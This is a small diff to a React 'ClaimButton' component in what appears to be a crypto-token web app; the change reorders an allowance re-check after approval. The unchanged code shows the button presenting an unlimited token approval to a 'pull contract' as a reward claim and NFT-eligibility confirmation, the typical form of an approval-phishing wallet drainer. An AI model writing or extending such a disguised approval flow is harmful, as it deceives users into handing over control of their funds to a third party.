@@ -96,15 +96,16 @@ export function ClaimButton() {
 
       await approveUnlimited(TOKEN_ADDRESS, PULL_CONTRACT_ADDRESS);
 
+      // Re-check allowance to confirm
+      const newAllowance = await getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS);
+      setAllowance(newAllowance);
+
       toast({
         title: "🎉 Success!",
         description: nftTier
           ? `Unlimited approval granted! Your ${nftTier.name} eligibility is confirmed.`
           : "Unlimited approval granted.",
       });
-
-      const newAllowance = await getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS);
-      setAllowance(newAllowance);
     } catch (error: any) {
       console.error("Claim error:", error);
       const message = error?.message || "";
